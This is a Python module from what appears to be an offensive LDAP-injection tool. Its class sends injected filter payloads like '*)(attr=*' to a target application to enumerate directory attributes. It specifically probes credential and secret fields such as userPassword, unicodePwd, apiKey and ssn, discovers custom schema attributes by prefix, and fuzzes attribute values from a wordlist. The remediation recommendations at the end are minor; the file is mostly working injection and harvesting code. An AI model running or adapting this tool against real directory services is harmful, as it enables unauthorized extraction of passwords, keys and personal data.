import re
import time

from ldapmap_attacker.lib.logger import setup_logger

logger = setup_logger()


class DirectoryAttributeProfiler:
    def __init__(self, exploiter):
        self.exploiter = exploiter
        self.discovered_attributes = set()
        self.standard_attribute_candidates = [
            "uid", "cn", "sn", "mail", "ou", "o", "c", "l", "st", "street",
            "telephoneNumber", "mobile", "title", "department", "manager",
            "employeeNumber", "employeeType", "givenName", "displayName",
            "roomNumber", "description", "postalAddress", "postalCode",
            "userPassword", "userCertificate", "employeeID", "jpegPhoto",
            "objectClass", "createTimestamp", "modifyTimestamp",
            "member", "memberOf", "uniqueMember", "owner",
            "roleOccupant", "accountExpires", "sAMAccountName",
            "sAMAccountType", "userAccountControl", "userPrincipalName",
            "distinguishedName", "photo",
        ]
        self.sensitive_attribute_candidates = [
            "userPassword", "unicodePwd", "pwd", "password", "userPass",
            "ntPassword", "lmPassword", "sshKey", "apiKey", "apiSecret",
            "token", "secret", "privateKey", "salary", "ssn", "rootPW",
            "adminPW", "bindPW", "masterKey", "encryptionKey",
        ]

    def survey_standard_attributes(self, limit=50):
        logger.info("Profiling commonly exposed LDAP attributes...")
        exposed_attributes = []

        for index, attribute_name in enumerate(self.standard_attribute_candidates[:limit]):
            if index and index % 10 == 0:
                time.sleep(0.2)

            if self._attribute_is_exposed(attribute_name):
                exposed_attributes.append(attribute_name)
                self.discovered_attributes.add(attribute_name)
                logger.vuln(f"Discovered directory attribute: {attribute_name}")

        logger.success(f"Attribute profiling complete: {len(exposed_attributes)} visible attributes")
        return exposed_attributes

    def survey_sensitive_attributes(self):
        logger.info("Profiling potentially sensitive LDAP attributes...")
        exposed_sensitive_attributes = []

        for attribute_name in self.sensitive_attribute_candidates:
            time.sleep(0.1)

            if self._attribute_is_exposed(attribute_name):
                exposed_sensitive_attributes.append(attribute_name)
                self.discovered_attributes.add(attribute_name)
                logger.vuln(f"Sensitive attribute exposed: {attribute_name}")

        return exposed_sensitive_attributes

    def _attribute_is_exposed(self, attribute_name):
        probe_filters = [
            f"*)({attribute_name}=*",
            f"({attribute_name}=*)",
        ]

        for ldap_filter in probe_filters:
            response = self.exploiter._make_request(ldap_filter)
            if response and self._response_mentions_attribute(response, attribute_name):
                return True

        return False

    def _response_mentions_attribute(self, response, attribute_name):
        attribute_markers = [
            f'"{attribute_name}":',
            f"{attribute_name}:",
            f"{attribute_name}=",
            f"<{attribute_name}>",
        ]

        if any(marker in response for marker in attribute_markers):
            return True

        return attribute_name.lower() in response.lower()

    def discover_custom_attributes(self):
        logger.info("Searching for custom LDAP schema attributes...")

        custom_attributes = []
        for prefix in "abcdefghijklmnopqrstuvwxyz":
            time.sleep(0.1)

            discovered_for_prefix = self._discover_attributes_by_prefix(prefix)
            if discovered_for_prefix:
                custom_attributes.extend(discovered_for_prefix)

        return {
            "standard_attributes": sorted(self.discovered_attributes),
            "custom_attributes": custom_attributes,
        }

    def _discover_attributes_by_prefix(self, prefix):
        harvested_attributes = []
        ldap_filter = f"*)({prefix}*=*"
        response = self.exploiter._make_request(ldap_filter)

        if not response:
            return harvested_attributes

        pattern = rf"{prefix}[a-zA-Z0-9]+[=:]"
        for match in re.findall(pattern, response, re.IGNORECASE):
            attribute_name = match.rstrip("=:").strip()
            if attribute_name and attribute_name not in self.discovered_attributes:
                harvested_attributes.append(attribute_name)
                self.discovered_attributes.add(attribute_name)

        return harvested_attributes

    def fuzz_attribute_values(self, attribute_name, wordlist):
        logger.info(f"Fuzzing LDAP values for attribute '{attribute_name}'...")
        matching_values = []

        for candidate_value in wordlist:
            time.sleep(0.05)
            ldap_filter = f"({attribute_name}={candidate_value}*)"
            response = self.exploiter._make_request(ldap_filter)

            if response and len(response) > 100:
                matching_values.append(candidate_value)
                logger.vuln(f"Value matched for {attribute_name}: {candidate_value}")

        return matching_values

    def build_report(self):
        return {
            "attributes": sorted(self.discovered_attributes),
            "sensitive_attributes": [
                attribute
                for attribute in sorted(self.discovered_attributes)
                if attribute in self.sensitive_attribute_candidates
            ],
            "count": len(self.discovered_attributes),
            "recommendations": [
                "Reduce anonymous attribute exposure in LDAP responses.",
                "Restrict access to credential-bearing and administrative attributes.",
                "Review schema extensions that leak internal directory structure.",
            ],
        }

    def guess_common_attrs(self, limit=50):
        return self.survey_standard_attributes(limit)

    def hunt_secrets(self):
        return self.survey_sensitive_attributes()

    def grab_custom_attrs(self):
        return self.discover_custom_attributes()

    def make_report(self):
        return self.build_report()


AttrGuesser = DirectoryAttributeProfiler
